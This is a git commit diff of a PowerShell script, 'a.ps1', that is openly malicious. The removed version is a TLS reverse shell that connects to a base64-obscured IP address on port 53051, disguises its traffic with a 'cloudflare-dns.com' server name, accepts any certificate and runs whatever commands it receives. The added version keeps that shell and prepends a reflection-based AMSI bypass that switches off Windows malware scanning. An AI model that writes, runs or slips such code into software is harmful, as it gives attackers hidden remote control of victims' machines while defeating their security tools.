7cf8857fbac72fdc874b8ee32831fa8df8cdf820
jktvz <admininfogathering@proton.me>
2026-02-17 00:59:06 +0300

    Update a.ps1

--- a.ps1
+++ a.ps1
@@ -1,48 +1,35 @@
-try {
-    $p = [System.Security.Authentication.SslProtocols]::Tls12
-    
-    $h = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MTQ2LjcwLjI0MC4yMDU='))
-    $prt = 53051
-
-    $c = New-Object Net.Sockets.TCPClient($h, $prt)
-    $ns = $c.GetStream()
-    
-    $sl = New-Object Net.Security.SslStream($ns, $false, ({"$true"} -as [Net.Security.RemoteCertificateValidationCallback]))
-    
-    $sni = "cloud" + "flare-dns" + ".com"
-    $sl.AuthenticateAsClient($sni, $null, $p, $false)
-
-    if(!$sl.IsEncrypted -or !$sl.IsSigned) {
-        $sl.Close()
-        exit
-    }
-
-    $sw = New-Object IO.StreamWriter($sl)
-    $sw.AutoFlush = $true
-
-    function Out-Flow ($txt) {
-        [byte[]]$script:buf = New-Object System.Byte[] 4096
-        $sw.Write($txt + "PS " + (Get-Location).Path + "> ")
-    }
-
-    Out-Flow ''
-
-    while(($r = $sl.Read($buf, 0, $buf.Length)) -gt 0) {
-        $cmd = ([text.encoding]::UTF8).GetString($buf, 0, $r - 1).Trim()
-        
-        if ($cmd -eq 'exit') { break }
-        
-        $res = try {
-            Invoke-Expression $cmd 2>&1 | Out-String
-        } catch {
-            $_ | Out-String
-        }
-        
-        Out-Flow ($res)
-    }
-
-    $sw.Close()
-    $c.Close()
-} catch {
-    exit
+$m = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+if ($m) {
+    $f = $m.GetField('amsiInitFailed', 'NonPublic,Static')
+    if ($f) { $f.SetValue($null, $true) }
 }
+
+try {
+    
+    $p = [System.Security.Authentication.SslProtocols]::Tls12
+    $i = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MTQ2LjcwLjI0MC4yMDU='));
+    $port = 53051
+
+    
+    $c = New-Object Net.Sockets.TCPClient($i, $port)
+    $st = $c.GetStream()
+    $s = New-Object Net.Security.SslStream($st, $false, ({$true} -as [Net.Security.RemoteCertificateValidationCallback]))
+    $s.AuthenticateAsClient("cloudflare-dns.com", $null, $p, $false)
+
+    $w = New-Object IO.StreamWriter($s); $w.AutoFlush = $true
+
+    function _out($txt) {
+        [byte[]]$script:b = New-Object System.Byte[] 4096
+        $w.Write($txt + "PS " + (Get-Location).Path + "> ")
+    }
+
+    _out ''
+
+    while(($r = $s.Read($b, 0, $b.Length)) -gt 0) {
+        $cmd = ([text.encoding]::UTF8).GetString($b, 0, $r).Trim()
+        if ($cmd -eq 'exit') { break }
+        $res = try { Invoke-Expression $cmd 2>&1 | Out-String } catch { $_ | Out-String }
+        _out $res
+    }
+    $w.Close(); $c.Close()
+} catch { exit }
